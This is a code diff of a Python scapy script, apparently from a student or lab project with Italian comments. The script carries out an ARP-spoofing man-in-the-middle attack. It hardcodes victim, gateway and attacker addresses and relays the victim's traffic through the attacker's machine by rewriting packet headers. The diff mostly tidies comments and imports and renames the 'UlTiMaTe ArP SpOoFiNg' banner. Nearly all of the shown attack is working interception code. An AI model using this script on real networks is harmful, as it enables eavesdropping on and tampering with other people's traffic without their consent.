@@ -2,12 +2,10 @@ from scapy.all import *
 from scapy.layers.inet import Ether, IP, TCP, UDP
 import time
 import threading
-import decimal 
-import socket
+
 gateway_mac='52:54:00:88:15:b6'
 my_mac='00:e0:4c:36:73:52'
 victim_mac='08:00:27:67:8f:72'
-broadcast_mac='ff:ff:ff:ff:ff:ff'
 victim_ip='192.168.20.45'
 gateway_ip='192.168.20.1'
 my_ip='192.168.20.55'
@@ -26,19 +24,15 @@ def sniffsniff(pckt):
 		if UDP in pckt:
 			del pckt[UDP].chksum
 		if TCP in pckt:	
-			#print("C'e' TCP nel traffico vittima->gateway")
 			del pckt[TCP].chksum 
-		#tmp_pckt.show2()
-
 		sendp(pckt,verbose=0)
 		print("Replicato a gateway")
-	elif (pckt[Ether].dst==my_mac and pckt[Ether].src==gateway_mac):
-		tmp_pckt=0		
+		
+	elif (pckt[Ether].dst==my_mac and pckt[Ether].src==gateway_mac):	
 		pckt[Ether].dst = victim_mac
 		pckt[Ether].src = my_mac
 		tmp_pckt=(pckt[Ether])
 		if IP in pckt:
-			#pckt[IP].ttl=pckt[IP].ttl+1
 			pckt[IP].dst=victim_ip
 			del pckt[IP].chksum
 		if UDP in pckt:
@@ -46,9 +40,7 @@ def sniffsniff(pckt):
 		if TCP in pckt:
 			#print("C'e' TCP nel traffico gateway->vittima")
 			del pckt[TCP].chksum
-		#tmp_pckt.show2()
 		sendp(pckt,verbose=0)
-		
 		print("Replicato a vittima")
 
 def arp_spoof():
@@ -59,7 +51,7 @@ def arp_spoof():
 
 
 
-print("UlTiMaTe ArP SpOoFiNg\n")
+print("Start\n")
 arp_spoof = threading.Thread(target=arp_spoof)
 arp_spoof.start()
 
